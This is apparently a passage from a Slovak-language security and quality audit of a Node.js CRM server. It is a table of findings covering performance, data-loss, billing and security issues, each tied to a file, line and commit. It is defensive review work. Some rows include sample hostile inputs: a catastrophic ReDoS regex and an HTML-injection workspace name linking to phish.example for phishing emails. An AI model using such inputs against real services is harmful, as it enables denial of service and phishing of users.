| STREDNÁ | `server/routes/billingApple.js:225` | ASSN webhook vracia 200 pre neznámeho používateľa – Apple pri 2xx notifikáciu NEopakuje, komentár predpokladá opak | Stratené renewal/refund udalosti; používateľ s neúspešným /verify ostane natrvalo na free pláne (alebo po refunde naopak na platenom). | `6e72629b` |
| STREDNÁ | `server/routes/contacts.js:2268` | Download prílohy bufferuje celý súbor (až 50 MB) v RAM namiesto streamovania z R2 | Niekoľko súbežných stiahnutí veľkých príloh (tím otvorí galériu fotiek z úlohy, FilePreviewModal sťahuje blob pre náhľad) = desiatky–stovky MB naraz na 512 MB inštancii → GC pauzy, OOM reštart. Rovnaký vzor je v tasks.js:3272 (mi… | `026b76f8` |
| STREDNÁ | `server/routes/contacts.js:2294` | Content-Disposition s percent-encoded názvom v `filename=""` (nesprávne názvy v WKWebView/Android WebView) | Stiahnuté prílohy majú nečitateľné názvy na mobilných platformách a v niektorých prehliadačoch. | `852f43b8` |
| STREDNÁ | `server/routes/errors.js:23` | Verejný error intake umožňuje spamovať nové fingerprinty → rast DB a alert fatigue | Jedna IP môže vytvoriť až ~86 000 dokumentov/deň (TTL 90 dní) → rast kolekcie a pomalšie admin Diagnostics; hodinové alert emaily na ADMIN_EMAIL → alert fatigue, útočník vie zamaskovať reálnu regresiu po deployi. | `e56e9568` |
| STREDNÁ | `server/routes/googleCalendar.js:291` | OAuth callback prepíše celý objekt `googleCalendar` – pri opätovnom pripojení sa stratia workspaceCalendars, syncedTaskCalendars, syncedEventHashes a… | Po reconnecte (napr. po expirácii refresh tokenu) sa zapne sync aj pre workspace-y, ktoré používateľ vypol; mapovanie udalosť→kalendár zmizne, takže `events.update` ide do nového kalendára → 404 → re-insert a staré udalosti ostan… | `1a6b33f9` |
| STREDNÁ | `server/routes/googleCalendar.js:790` | Webhook watch sleduje iba legacy `calendarId` ('primary'), zatiaľ čo udalosti sa zapisujú do per-workspace kalendárov | Obojsmerná synchronizácia Google → CRM (zmena dátumu, názvu, dokončenia, zmazanie v Google Calendari) pre aktuálnu architektúru reálne nefunguje; funguje len pre historické udalosti v primary kalendári. | `ca294fce` |
| STREDNÁ | `server/routes/googleCalendar.js:1233` | /sync, /cleanup a /sync-task načítavajú celé Task/Contact dokumenty (vrátane legacy base64 `files.data`) bez projekcie a bez `.lean()` | Pri workspace s prílohami sa pri každom synci prenášajú MB base64 dát a hydratujú tisíce subdokumentov – dlhšia odpoveď, vyššia pamäť, vyššie IOPS. | `fc806fe6` |
| STREDNÁ | `server/routes/googleCalendar.js:1315` | /sync drží HTTP request až 9 minút (Tasks 10 min) – mobilné WebView a proxy ho prerušia, server pokračuje | Na mobilných platformách nespoľahlivé „Synchronizovať“ (timeout bez výsledku), duplicitné spustenia, zbytočné blokovanie HTTP spojení. | `deebf3a5` |
| STREDNÁ | `server/routes/googleCalendar.js:1533` | /sync-task/:taskId padá CastError-om pre UUID id kontaktových úloh/podúloh a načítava všetky kontakty workspace | Jednotlivá synchronizácia kontaktovej úlohy/podúlohy nikdy neprejde (500 s interným textom chyby); zbytočná záťaž DB. | `8df08896` |
| STREDNÁ | `server/routes/googleCalendar.js:2138` | /delete-all ignoruje per-workspace kalendáre a nečistí `syncedTaskCalendars`/`syncedEventHashes`/`workspaceCalendars` | Používateľ dostane „Vymazaných 0 udalostí“ (úspech), ale v Google ostanú všetky kalendáre a udalosti; po ďalšom synci vzniknú duplicity (mapping bol vynulovaný). | `f6f83d79` |
| STREDNÁ | `server/routes/googleCalendar.js:2661` | Lock pre /sync expiruje po 30 s, ale sync beží až 9 minút – paralelný druhý sync vytvorí duplicity | Opakované kliknutie/retry klienta po 30 s (bežné pri mobilných timeoutoch) vedie k duplicitným udalostiam v Google Calendari a súbežným `user.save()` nad tou istou mapou. | `cd6d92a0` |
| STREDNÁ | `server/routes/googleCalendar.js:2731` | Auto-sync pri každej zmene úlohy načítava celé User dokumenty vrátane `avatarData` (base64 až ~6 MB/user) | Pri workspace s 10 členmi sa pri každej úprave úlohy môže z Mongo prečítať desiatky MB; vyššia latencia, IOPS na Atlas a pamäťové špičky Node procesu (tie isté dokumenty sa potom aj `save()`-ujú). | `0c84f092` |
| STREDNÁ | `server/routes/googleTasks.js:338` | OAuth callback Google Tasks prepíše celý objekt `googleTasks` (stratí opt-out workspace-ov a mapovanie listov) a nuluje `syncedTaskIds`, hoci úlohy v… | Po opätovnom pripojení duplicitné úlohy v Google Tasks, obnovený sync vo vypnutých workspace-och a pomalší návrat do aplikácie na iOS/Android WebView. | `1a6b33f9` |
| STREDNÁ | `server/routes/googleTasks.js:1631` | /reset-sync (+ /sync force) nuluje mapping bez zmazania úloh v Google → každý „Resync“ zdvojnásobí úlohy v Google Tasks | Používateľ, ktorý použije „Resetovať a synchronizovať“, dostane v Google Tasks duplicitu každej úlohy; polling potom má nejednoznačné mapovanie. Zbytočné čerpanie kvóty. | `557e5397` |
| STREDNÁ | `server/routes/googleTasks.js:1832` | ReDoS: `new RegExp(searchTerm)` z tela requestu bez escapovania a bez kontroly typu/dĺžky | Autentifikovaný používateľ môže poslať katastrofický vzor (napr. `(a+)+$`) a zablokovať event loop Node procesu (DoS pre všetkých tenantov); nevalidný vzor vyhodí SyntaxError → 500. | `e1bd3c25` |
| STREDNÁ | `server/routes/googleTasks.js:2510` | Polling: vyhľadanie podúlohy bez workspace filtra – zápis do úloh workspace-u, ktorého user už nie je členom, plus COLLSCAN | Narušenie tenant izolácie (zápis stavu podúlohy mimo členstva) v okrajovom prípade odchodu z workspace; výkonovo plný sken kolekcie Task pri každej zmene podúlohy v Google. | `bc1a91ea` |
| STREDNÁ | `server/routes/googleTasks.js:2629` | Polling každých 5 minút načítava všetkých enabled userov ako plné dokumenty (vrátane `avatarData`) | Zbytočný prenos desiatok MB z Mongo každých 5 minút a pri každej mutácii úlohy (Atlas M0 IOPS, pamäť procesu), hoci komentár v kóde výslovne rieši IOPS limity. | `91660104` |
| STREDNÁ | `server/routes/messages.js:130` | handleMessageWriteError mapuje Mongoose ValidationError/CastError (chyba vstupu) na 500 + záznam do Diagnostiky | Klient dostane 500 pre vlastnú chybu, Diagnostika sa plní falošnými serverovými chybami (fingerprint per správa chyby). | `a6897428` |
| STREDNÁ | `server/routes/messages.js:161` | Nahrávanie príloh: memoryStorage 50 MB bez rate limitu na /files, bez limitu počtu súborov na správu a bez kvóty pre free/trial | DoS vyčerpaním pamäte (OOM reštart inštancie = výpadok pre všetkých), neobmedzený rast R2 úložiska a nákladov. | `5cabb3a3` |
| STREDNÁ | `server/routes/messages.js:261` | Každý upload prepočítava využitie úložiska načítaním VŠETKÝCH kontaktov, úloh a správ workspace-u | Lineárne spomalenie uploadov s rastom dát tímu, pamäťové špičky; zdieľané s tasks.js/contacts.js. | `5cabb3a3` |
| STREDNÁ | `server/routes/messages.js:361` | Query parametre sa vkladajú priamo do Mongo filtra (operátorová injekcia cez qs) | Útočník v rámci workspace môže vynútiť `$regex` (ReDoS) alebo obísť stavové filtre; na admin routes nízke riziko (len super-admin). | `6e5175c9` |
| STREDNÁ | `server/routes/messages.js:389` | GET /messages/by-linked: linkedType/linkedId z req.query idú bez typovej kontroly do Mongo filtra (operátorová injekcia) | Ľubovoľný člen workspace si vie prečítať metadáta a texty (subject, description, komentáre) správ medzi inými dvoma členmi — únik súkromnej komunikácie v rámci tenanta. | `6e5175c9` |
| STREDNÁ | `server/routes/messages.js:607` | Chýba validácia ObjectId pre :id a :commentId → Mongoose CastError → 500 namiesto 400/404 | Nesprávny stavový kód pre klientskú chybu, šum v Diagnostike (ServerError kolekcia), ľahko spustiteľné z URL. | `fc989db7` |
| STREDNÁ | `server/routes/messages.js:686` | approve/reject/reopen/vote načítavajú celý Message dokument vrátane base64 blobov len kvôli zmene statusu | Pomalé schvaľovanie/hlasovanie a pamäťové špičky na Render inštancii pri správach s veľkými inline prílohami. | `05a7b9d8` |
| STREDNÁ | `server/routes/messages.js:1538` | DELETE /:id/files/:fileId prepisuje celé pole files (read → filter → $set): strata súbežných zmien a prenos base64 | Stratené aktualizácie pri súbežnej práci dvoch členov na tej istej správe, zbytočný prenos megabajtov base64. | `6e30f961` |
| STREDNÁ | `server/routes/messages.js:1564` | DELETE /:id — porovnanie ObjectId s req.user.id bez toString() → odosielateľ dostane 403 | Mazanie vlastných správ bežným členom zlyháva (najmä bez Redis / po expirácii cache), neprehľadné správanie pre používateľa. | `6d707390` |
| STREDNÁ | `server/routes/tasks.js:231` | Task.find pre celý workspace bez projekcie (a s 30 s timeoutom) – načítava všetky polia vrátane prípadných legacy base64 dát | Vysoká latencia a pamäťová záťaž pri načítaní zoznamu úloh vo väčších workspace. | `6d65e491` |
| STREDNÁ | `server/routes/tasks.js:261` | Neplatný reťazec v assignedTo kontaktnej úlohy zhodí GET /tasks pre celý workspace (CastError) | Jediná chybná hodnota (chyba klienta alebo úmysel člena) trvalo rozbije zoznam projektov `/tasks` pre všetkých členov workspace (500 pri každom načítaní, až do ručnej opravy v DB); dá sa zneužiť ako DoS v rámci tenantu. | `c2024c02` |
| STREDNÁ | `server/routes/tasks.js:1107` | User.findById bez projekcie načítava avatarData (až ~6,7 MB) pri každom POST /tasks a pri kalendárnych feedoch | Zbytočný prenos megabajtov z Atlas M0 a alokácia v RAM pri každom vytvorení projektu a každom polli kalendárneho feedu; spomaľuje odpoveď a zaťažuje DB. | `35b19c29` |
| STREDNÁ | `server/routes/tasks.js:1107` | Plánové limity sa vyhodnocujú podľa plánu volajúceho člena, nie vlastníka workspace | Obchádzanie plánových limitov (strata príjmu) a zároveň blokovanie legitímnych členov platených workspace-ov; nekonzistentné správanie medzi middleware a routami. Zámer dizajnu neoverený. | `0a558a2e` |
| STREDNÁ | `server/routes/tasks.js:1142` | `assignedTo` sa ukladá bez validácie (typ, formát, členstvo vo workspace) | Možnosť priradiť úlohu a doručiť notifikácie používateľom mimo tenantu; nevalidné hodnoty v DB (CastError pri populate, pády klienta). | `f7ef4b09` |
| STREDNÁ | `server/routes/tasks.js:1625` | assignedTo sa neoveruje voči členom workspace – push notifikácie ľubovoľnému používateľovi | Cross-tenant injekcia notifikácií: prihlásený používateľ z workspace A vie poslať push notifikáciu s vlastným textom (názov úlohy, meno actora) a záznam do zvončeka ľubovoľnému používateľovi systému vrátane cudzích tenantov; spam… | `f7ef4b09` |
| STREDNÁ | `server/routes/tasks.js:1799` | Dokument načítaný s `EXCLUDE_FILE_DATA` sa následne ukladá cez `markModified('tasks')` + `save()` – riziko prepísania legacy base64 dát (neoverené) | Potenciálna strata obsahu legacy príloh pri úprave úloh kontaktu. | `b0ea8e6e` |
| STREDNÁ | `server/routes/tasks.js:1950` | Sedem catch blokov prehltne chybu bez logu a bez záznamu do Diagnostiky | Produkčné 500-ky na najpoužívanejších mutáciách (vytvorenie, úprava, zmazanie projektu/podúlohy) sú bez príčiny – nedá sa diagnostikovať ani CastError z nálezov 03/04, ani zlyhanie `contact.save()`. | `f9838d30` |
| STREDNÁ | `server/routes/tasks.js:2150` | POST /:id/duplicate obchádza PLAN_LIMIT projektov | Free používateľ obíde limit 5 projektov na kontakt/globálne neobmedzeným duplikovaním; duplikácia navyše nevytvára audit log, notifikácie ani Google sync (nekonzistencia s POST /). | `7118f153` |
| STREDNÁ | `server/routes/tasks.js:2500` | Zápisové cesty načítavajú Contact s EXCLUDE_FILE_DATA a potom save() celého poľa tasks – legacy base64 prílohy sa prepíšu | Jediné odškrtnutie podúlohy v kontakte nenávratne vymaže Base64 dáta všetkých ešte nemigrovaných príloh v úlohách toho kontaktu (download potom skončí „Dáta súboru nenájdené — súbor treba znovu nahrať“). Rozsah závisí od toho, ko… | `b0ea8e6e` |
| STREDNÁ | `server/routes/tasks.js:3246` | Súborové endpointy sú vyňaté z rate limitu a download bufferuje celý súbor (až 50 MB) v RAM | Jeden prihlásený účet môže paralelnými downloadmi 50 MB súborov vyčerpať RAM inštancie na Render (OOM = výpadok pre všetkých tenantov) alebo opakovanými uploadmi zahltiť DB plnými skenmi; neautentizované požiadavky na tieto cesty… | `e8d66e41` |
| STREDNÁ | `server/routes/workspaces.js:90` | Načítanie celého User dokumentu vrátane avatarData (Base64 blob) len kvôli subscription.plan | Každé GET /current, switch, join, pozvánka a accept prenesie z MongoDB megabajty zbytočných dát, zvyšuje latenciu a pamäť procesu; GET /current sa volá pri každom načítaní appky na všetkých platformách. | `8fd92b54` |
| STREDNÁ | `server/routes/workspaces.js:555` | Zmena roly, odstránenie člena a prevod vlastníctva neinvalidujú workspace cache (až 60 s stale oprávnenia) | Odstránený alebo degradovaný používateľ si ponecháva prístup/adminské práva až 60 s po zásahu (na každej inštancii zvlášť). | `19e175c1` |
| STREDNÁ | `server/routes/workspaces.js:587` | Detekcia „odstraňujem seba“ pri DELETE člena zlyhá pri ObjectId req.user.id | Nekonzistentné správanie pri opustení workspace (chýbajúce notifikácie, iné oprávnenia) závislé od stavu cache. | `09b68813` |
| STREDNÁ | `server/routes/workspaces.js:663` | Notifikácia „člen opustil prostredie“ sa nikdy nevytvorí – typ 'workspace' nie je v enume modelu | Tichá strata funkcie – vlastníci/manažéri nedostanú upozornenie, že člen odišiel. | `23e9472a` |
| STREDNÁ | `server/routes/workspaces.js:726` | Zmazanie workspace necháva osirelé Page, Notification a ContactFile/R2 objekty | Trvalé náklady za R2 úložisko, osirelé dáta tenantov (GDPR), rastúce kolekcie. | `0f6b950c` |
| STREDNÁ | `server/routes/workspaces.js:744` | Zmazanie workspace nemaže Pages a Notifications — osirelé dáta | Trvalé osirelé Pages (až 500 kB obsahu každá) po zmazaných workspace — rast DB, GDPR problém (dáta klienta ostávajú po zrušení prostredia), notifikácie odkazujú na neexistujúci workspace. | `e1d6a99d` |
| STREDNÁ | `server/routes/workspaces.js:838` | Odoslanie e-mailu s pozvánkou blokuje odpoveď bez timeoutu (SMTP transporter nemá timeouty) | Pri výpadku SMTP sa UI pozvánok zasekne (mobilné WebView/PWA ukážu spinner minúty), klientske retry vytvoria duplicitné pokusy, HTTP spojenia Render inštancie sa vyčerpajú. | `e9aaad10` |
| STREDNÁ | `server/routes/workspaces.js:1013` | Prijatie pozvánky pri plnom workspace vracia iOS používateľom text o upgrade plánu (Apple 3.1.1) a bez kódu PLAN_LIMIT | V natívnej iOS appke (PrplCRM-iOS UA) sa zobrazí zmienka o platenom pláne mimo IAP — riziko zamietnutia pri App Store review; UpgradeModal sa nevystrelí (chýba code) a štatistika plan.limit_hit v audit logu je neúplná. | `3671970d` |
| STREDNÁ | `server/scripts/cleanupTestTasks.js:22` | Skript maže úlohy s „test“ v názve naprieč všetkými workspace bez potvrdenia a env guardu | Omylom spustený skript proti produkčnej DB trvalo zmaže zákaznícke úlohy. | `d947b297` |
| STREDNÁ | `server/scripts/seed-admin.js:17` | Napevno zapísané administrátorské heslá v skriptoch (hodnoty zámerne neuvádzam) | Ak boli skripty niekedy spustené proti produkcii, heslá sú známe každému s prístupom k repozitáru/git histórii. | `d947b297` |
| STREDNÁ | `server/services/adminEmailService.js:105` | HTML injekcia v e-maile s pozvánkou — neescapované meno pozývateľa a názov workspace | Útočník si vytvorí workspace s názvom typu `X</strong><a href="https://phish.example">Prihláste sa</a>` alebo zmení username na HTML a pošle pozvánku ľubovoľnej e-mailovej adrese — obeť dostane dôveryhodne vyzerajúci phishingový … | `129b3640` |
| STREDNÁ | `server/services/apiMetrics.js:35` | Neobmedzený rast `counters.routes` pre nespárované cesty (404 skeny) | Pomalý únik pamäte v dlho bežiacom procese; automatizovaný sken s tisíckami URL vie proces nafúknuť. | `aa4e7477` |
| STREDNÁ | `server/services/dueDateChecker.js:392` | checkDueDates nemá ochranu proti prekrývajúcim sa behom – duplicitné notifikácie | Duplicitné push/in-app notifikácie pre tie isté termíny; zvýšená záťaž DB a push služieb; pri viacerých inštanciách systematicky N-násobné notifikácie. | `03ecd021` |
| STREDNÁ | `server/services/dueDateChecker.js:403` | Každých 5 min full-collection scan Task bez projekcie – načítava aj base64 súbory | Opakované pamäťové špičky a sieťový prenos (legacy inline súbory), záťaž Mongo každých 5 min; pri raste dát sa beh predĺži nad 5 min a prekryje sa (nález 05). | `fd53cb52` |
| STREDNÁ | `server/services/dueDateChecker.js:458` | Pripomienky pre podúlohy sa neposielajú ich vlastným assignee, iba assignee rodičovského projektu | Zmeškané termíny podúloh pre ich skutočných riešiteľov; zbytočné notifikácie pre ostatných. | `a9b7e8c7` |
| STREDNÁ | `server/services/dueDateChecker.js:893` | Lost update: celé pole contact.tasks (a task.subtasks) sa prepisuje zastaraným snapshotom | Tichá strata používateľských zmien v úlohách (najmä v rannom okne 06:00 a v minúte, keď fajčí časová pripomienka). Okno je rádovo stovky ms až sekundy na kontakt/úlohu. | `fd53cb52` |
| STREDNÁ | `server/services/fileStorage.js:39` | S3/R2 klient bez connection/request/socket timeoutu – visiaci R2 request zablokuje upload/download/kópiu na neurčito | Pri výpadku/čiernej diere na R2 strane ostane request visieť: pri uploade sa drží 50 MB buffer v RAM (Render Starter 512 MB) a idempotentný kľúč `upload:<user>:<uploadId>` je 30 min „pending“ (klient dostáva 409 UPLOAD_IN_PROGRES… | `6631bc9d` |
| STREDNÁ | `server/services/notificationService.js:228` | APNs timeout používa client.close() namiesto destroy() – zaseknutý stream drží socket; timer sa nikdy nečistí | Únik socketov/pamäte pri pomalom alebo nedostupnom APNs; v extrémnom prípade vyčerpanie file descriptorov inštancie. | `01d847ed` |
| STREDNÁ | `server/services/notificationService.js:565` | Push payload (web push/APNs/FCM) obsahuje neorezané hodnoty z notification.data – prekročenie 4 KB zhodí doručenie | Používateľ s právom upravovať projekt/kontakt môže (aj neúmyselne) vyradiť push notifikácie celému workspace; pri FCM trvalo. | `e68034c7` |
| STREDNÁ | `server/services/notificationService.js:644` | Safari na macOS nedostáva web push, ak má používateľ iOS appku (filter podľa web.push.apple.com) | Používateľ s iPhone appkou a Safari na Macu nikdy nedostane desktop push; vyzerá to ako nefunkčný Safari push. | `f5fa0729` |
| STREDNÁ | `server/services/notificationService.js:911` | Sekvenčné `await createNotification` pre každého príjemcu (fan-out na členov workspace) | Pomalé odpovede pri vytváraní/úprave úloh vo väčších tímoch; pri zlyhaní jedného príjemcu sa reťaz preruší. | `a8f93a8f` |
| STREDNÁ | `server/services/planExpiration.js:45` | Auto-expirácia nevynecháva Apple IAP predplatné — downgrade počas Apple billing-retry/grace period a `source` ostáva 'apple' | iOS platiaci používatelia v grace period strácajú prístup predčasne; po expirácii cez tento sweep vidia mätúce UI a dostávajú nepoužiteľné promo kódy; `source` v DB je nekonzistentné so skutočným stavom. | `d023226e` |
| STREDNÁ | `server/services/subscriptionCleanup.js:38` | Cleanup maže platné web-push subscriptions po 30 dňoch bez notifikácie — klient sa pri štarte znova neregistruje | Tiché zlyhanie push notifikácií pre menej aktívnych používateľov na webe/PWA/Android TWA; 'stále' subscriptions by pritom pri ďalšom odoslaní odhalil 404/410 z push služby (notificationService ich už maže). | `3de60cd9` |
| STREDNÁ | `server/services/subscriptionReminders.js:38` | T-7/T-1 pripomienky so Stripe promo kódmi sa posielajú aj Apple IAP predplatiteľom (každý cyklus) | Mätúce a nepravdivé e-maily pre platiacich iOS používateľov; promo kódy sú Stripe-only; odkaz vedie na web Stripe checkout → riziko dvojitej platby (viď srv-billing-01). | `d023226e` |
| STREDNÁ | `server/utils/storageQuota.js:65` | Výpočet storage kvóty načíta pri každom uploade a kópii všetky Contact, Task a Message dokumenty workspace-u | Pro workspace s neobmedzeným počtom kontaktov a tisíckami správ platí za každý nahraný súbor (fronta nahrávaní ich posiela sériovo, teda N× za dávku) plný prenos troch kolekcií z Atlasu → latencia uploadu a záťaž na zdieľanú DB; … | `5cabb3a3` |
| NÍZKA | `server/index.js:95` | CSP posiela len API server — SPA (samostatný Render static site) žiadnu CSP hlavičku nedostáva | Aplikácia reálne beží bez CSP (žiadna mitigácia XSS/clickjacking na úrovni dokumentu), hoci dokumentácia v kóde tvrdí opak — falošný pocit bezpečia pri budúcich auditoch. | `c79f3435` |
| NÍZKA | `server/index.js:150` | apiLimiter beží až PO parsovaní JSON tela — limitovaný klient stále núti server parsovať 1MB telo pri každom requeste | Zbytočná CPU/pamäťová práca pre requesty, ktoré aj tak skončia 429 — zosilnenie DoS pri flood-e s veľkými telami na Render Starter inštancii. | `99495ae0` |
| NÍZKA | `server/index.js:266` | Globálny error handler: ignoruje err.statusCode, vracia generickú 5xx správu aj pre 4xx chyby a nemá guard na res.headersSent | Klient (web, Android/iOS WebView) zobrazí „chyba servera" pri vlastnej chybe requestu (napr. príliš veľká stránka alebo poškodené telo), používateľ opakuje a hlási falošné výpadky; chyby počas streamovania produkujú sekundárnu vý… | `62b901df` |
| NÍZKA | `server/index.js:309` | Socket.IO: listener 'join-page' sa registruje až po await DB dotazu — skorý join-page z klienta sa potichu zahodí | Intermitentne (závisí od pomeru RTT klienta vs. latencie DB) sa používateľ nepripojí do page roomu a nedostáva realtime page/block/cursor updaty, kým stránku neopustí a neotvorí znova; najviditeľnejšie pri prvom otvorení stránky … | `83ecb6e0` |
| NÍZKA | `server/index.js:400` | Socket.IO relay page-update/block-update preposiela content/title bez typovej a veľkostnej kontroly a bez per-socket limitu | Člen workspace (alebo klient s ukradnutým tokenom) môže zahltiť ostatných členov v roome ~1 MB paketmi s vysokou frekvenciou (N-násobné zosilnenie egressu servera a zamrznutie editorov na mobilných WebView); nestringový `content`… | `9c0ac33f` |
| NÍZKA | `server/index.js:484` | Graceful shutdown čaká na server.close(), ktorý sa pri otvorených Socket.IO spojeniach nikdy nedokončí → vždy force-exit(1) bez zatvorenia Mongo | Každý deploy/reštart na Render trvá plných 10 s, končí exit kódom 1 (v logoch vyzerá ako zlyhanie), Mongo pool sa nezatvára čisto a Socket.IO klienti (najmä mobilné WebView) sa dozvedia o výpadku až cez TCP reset/ping timeout nam… | `e6911e59` |
| NÍZKA | `server/index.js:523` | Hardcoded PRO_EMAILS default pri každom štarte prideľuje plán 'pro' do roku 2099 dvom e-mailom zapísaným v zdrojáku | Obchádzanie platobnej logiky mimo Stripe toku na základe hardcoded hodnoty; audit stopa zmeny plánu chýba (nejde cez admin endpoint ani AuditLog). | `b983106f` |
| NÍZKA | `server/index.js:550` | Štartovacie „one-shot" migrácie bežia pri každom boote ako full collection scan bez indexu | Zbytočná záťaž Atlas M0 presne v momente štartu, keď inštancia zároveň obsluhuje prvé requesty; s rastom počtu používateľov sa predlžuje čas do „plne funkčného" stavu po deployi. | `b983106f` |
| NÍZKA | `server/jobs/errorAlerter.js:52` | Hodinový dotaz na `firstSeen` bez indexu — kolekčný scan ServerError | Dva full scany kolekcie každú hodinu; pri desiatkach tisíc dokumentov zbytočná záťaž na zdieľanej Mongo inštancii. | `37a2b455` |
| NÍZKA | `server/jobs/errorAlerter.js:186` | setInterval bez handle, unref() a stop() — job sa nedá zastaviť | Visiaci event loop v testoch/skriptoch, nemožnosť čisto zastaviť job pri shutdown-e; pri budúcom odstránení `process.exit` by proces po SIGTERM neskončil. | `9306914a` |
| NÍZKA | `server/jobs/healthMonitor.js:79` | Duplicitný kľúč $ne v objekte — filter počíta aj userov bez Google tokenu | Metrika `google` v admin health snapshote (`/api/admin/health/full`) je trvalo nesprávna (nadhodnotená); zbytočný scan kolekcie každých 5 min. | `3816cff0` |
| NÍZKA | `server/middleware/auth.js:46` | Auth cache serializuje do Redis celý User dokument vrátane bcrypt hashu a OAuth tokenov | Rozširovanie tajomstiev (hashe hesiel, reset-token hashe, prípadne plaintext Google tokeny u legacy userov bez ENCRYPTION_KEY) do tretej strany a do pamäťových dumpov; kompromitácia Redis = offline cracking hesiel a prístup ku Go… | `57c98ad6` |
| NÍZKA | `server/middleware/rateLimiter.js:71` | loginEmailLimiter.keyGenerator padne na TypeError, ak email v tele nie je string → 500 namiesto 400 | Útočník vie lacno generovať falošné 5xx záznamy v Diagnostike (šum pre errorAlerter) a klient dostáva 500 namiesto zrozumiteľného 400; per-email limiter sa pre takéto requesty vôbec neuplatní (namiesto toho padne request). | `39eadc92` |
| NÍZKA | `server/middleware/rateLimiter.js:107` | passwordChangeLimiter je kľúčovaný podľa IP, nie podľa používateľa (ako tvrdí komentár) — zdieľaný limit 3/h pre celú NAT sieť | Falošné 429 „Príliš veľa pokusov o zmenu hesla" pre nevinných používateľov zdieľajúcich IP (najmä mobilní), zatiaľ čo útočník s rotujúcimi IP limit obíde — limiter neplní deklarovaný účel. | `050aada0` |
| NÍZKA | `server/middleware/rateLimiter.js:185` | apiLimiter skip: podmienky /health a /uploads sú mŕtve, zatiaľ čo všetky /files endpointy nemajú ŽIADNY rate limit | Autentifikovaný používateľ (alebo kompromitovaný token) môže neobmedzene opakovať sťahovanie príloh z R2 (egress náklady, CPU na streamovanie, zahltenie connection poolu) bez toho, aby ho čokoľvek pribrzdilo. | `050aada0` |
| NÍZKA | `server/middleware/workspace.js:76` | requireWorkspace (fallback bez X-Workspace-Id) načíta celý User dokument len kvôli currentWorkspaceId | Zbytočný prenos MB dát a CPU na dešifrovanie pri každom requeste klientov bez hlavičky; zvyšuje latenciu práve na slabších mobilných zariadeniach. | `29797554` |
| NÍZKA | `server/middleware/workspace.js:196` | requireWorkspaceAdmin/Owner obaľujú async requireWorkspace do new Promise, ktorý sa pri odmietnutí nikdy nevyrieši — kontrola headersSent je nedosiah… | Mŕtvy kód a Promise-wrapper okolo funkcie, ktorá už vracia Promise (presne vzor, ktorý chce vlastník odstrániť); sťažuje ladenie, lebo visiace promisy nie sú viditeľné v stack trace. | `145c382d` |
| NÍZKA | `server/models/Notification.js:109` | Redundantné a nízkokardinálne indexy na zapisovo-ťažkých kolekciách (Notification 9 indexov, prefixy compoundov duplikované) | Každý insert notifikácie (vysoká frekvencia — každá zmena úlohy pre každého člena) aktualizuje 9 indexov; zbytočná RAM/úložisko na Atlas free/shared tieri (ContactFile.js komentár spomína 91 % využitia 512 MB). | `8005b23c` |
| NÍZKA | `server/models/Task.js:25` | Vnorené podúlohy od 2. úrovne sú netypované (type: Array = Mixed) — bez validácie typov, dĺžok a hĺbky | Nekonzistentné dáta pre dueDateChecker (getUrgencyLevel na ne-stringu, processSubtasks rekurzia), Google sync a klientov na všetkých platformách; možnosť nafúknuť dokument až k 16 MB limitu a spomaliť celý workspace (GET /tasks n… | `72e1a7a2` |
| NÍZKA | `server/models/Workspace.js:41` | settings.defaultMemberRole enum ['member','admin'] nesedí s WorkspaceMember.role enum ['owner','manager','member'] | Ak nejaký Workspace má defaultMemberRole = 'admin', nikto sa doň nevie pridať cez kód pozvánky (500); schéma dovoľuje nekonzistentný stav. | `050aada0` |
| NÍZKA | `server/models/Workspace.js:66` | generateSlug vráti prázdny slug pre názvy bez latinky (emoji, cyrilika, CJK) → required validácia padne → 500 pri vytvorení workspace | Používateľ s názvom workspace zloženým len z emoji/nelatinkových znakov nevie vytvoriť workspace a dostane neinformatívnu chybu servera; falošné 5xx v Diagnostike. | `050aada0` |
| NÍZKA | `server/routes/admin.js:40` | POST /admin/login: password bez typovej kontroly a user.password môže byť null → bcrypt vyhodí výnimku → 500 | Nesprávny status a chýbajúca bezpečnostná stopa pre najcitlivejší login v systéme. | `ef63d5c5` |
| NÍZKA | `server/routes/admin.js:224` | Druhé priradenie `filter.$or` prepíše prvé (kombinácia filtrov sa stráca) | Admin filter vracia nesprávnu množinu používateľov pri kombinácii kritérií. | `cdfa0217` |
| NÍZKA | `server/routes/admin.js:234` | GET /users: filter search prepíše filter.$or z hasStripe=false | Admin pri kombinácii filtra 'bez Stripe' + vyhľadávanie vidí aj platiacich používateľov; nesprávne čísla v breakdown. | `cdfa0217` |
| NÍZKA | `server/routes/admin.js:409` | Väčšina /users/:userId a /:id routes nevaliduje ObjectId → CastError končí ako 500 | Falošné 5xx v Diagnostike a metrikách error rate; klient dostane nesprávny status (500 namiesto 400/404). | `f6fdd13a` |
| NÍZKA | `server/routes/admin.js:424` | Admin zmena role/plánu, bulk update a zmazanie používateľa neinvalidujú auth cache (30 s stale) | Odobratie role/plánu alebo zmazanie účtu adminom sa prejaví až po 30 s – zmazaný používateľ má ešte chvíľu platnú session, demotovaný používateľ môže ešte volať admin-only push endpointy. | `8c94b243` |
| NÍZKA | `server/routes/admin.js:454` | PUT /users/:userId/workspace-role: workspaceId z body bez typovej kontroly v Mongo filtri | Nepredvídateľná zmena role v inom workspace a nečitateľný audit záznam (admin-only, nízka závažnosť). | `f6fdd13a` |
| NÍZKA | `server/routes/admin.js:1183` | GET /audit-log: query parametre bez typovej kontroly idú priamo do Mongo filtra (operator injection, Invalid Date → 500) | Kompromitovaný alebo zneužitý admin token vie poslať katastrofický regex na neindexované polia a zahltiť Mongo (ReDoS), prípadne vyvolať 500 namiesto 400. | `239a2fd1` |
| NÍZKA | `server/routes/admin.js:1296` | GET /export/users a /export/workspaces: O(U×M) filtrovanie členstiev v slučke | Export pri tisícoch používateľov blokuje event loop na sekundy; zbytočný prenos veľkých dokumentov z Mongo. | `3ae8434e` |
| NÍZKA | `server/routes/admin.js:1388` | PUT /users/bulk: userIds bez validácie typu, dĺžky a formátu ObjectId | 500 namiesto 400 pri chybnom vstupe, falošné záznamy v Diagnostike; neobmedzene veľký `$in`. | `bbe158c7` |
| NÍZKA | `server/routes/admin.js:1426` | PUT /users/:userId/subscription: plan a paidUntil bez validácie → ValidationError/CastError ako 500 | Nesprávny HTTP status, falošné 5xx v Diagnostike, žiadny log príčiny. | `2f7cff7f` |
| NÍZKA | `server/routes/admin.js:1505` | PUT /users/:userId/discount: value nie je číslo-validované; reťazec spôsobí reťazenie v setMonth | Nesprávne predĺženie plateného obdobia alebo zľava bez hodnoty; 500 pri zlom dátume. | `c7be6796` |
